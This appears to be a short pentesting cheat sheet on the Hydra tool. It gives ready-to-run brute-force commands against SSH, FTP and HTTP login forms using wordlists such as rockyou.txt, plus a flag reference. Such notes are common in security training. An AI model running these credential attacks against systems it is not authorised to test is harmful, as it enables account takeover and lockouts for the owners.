# Hydra – Online Password Cracking

Hydra is used for **online brute-force and dictionary attacks**
against network services.

⚠️ Works only when the service is running and reachable.

---

## 🔹 Basic Syntax
hydra -l <username> -P <password_list> <target> <service>

---

## 🔹 Common Examples

### SSH Brute Force
hydra -l root -P rockyou.txt 192.168.1.10 ssh

### FTP Brute Force
hydra -l admin -P passwords.txt 192.168.1.10 ftp

### HTTP POST Login Form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Failed=Invalid"

---

## 🔹 Important Flags
-l  → single username  
-L  → username list  
-p  → single password  
-P  → password list  
-t  → number of threads  
-vV → verbose output  

---

## 🔹 Notes
- Hydra **does NOT crack hashes**
- Used only for **online services**
- Can cause account lockout if protection exists
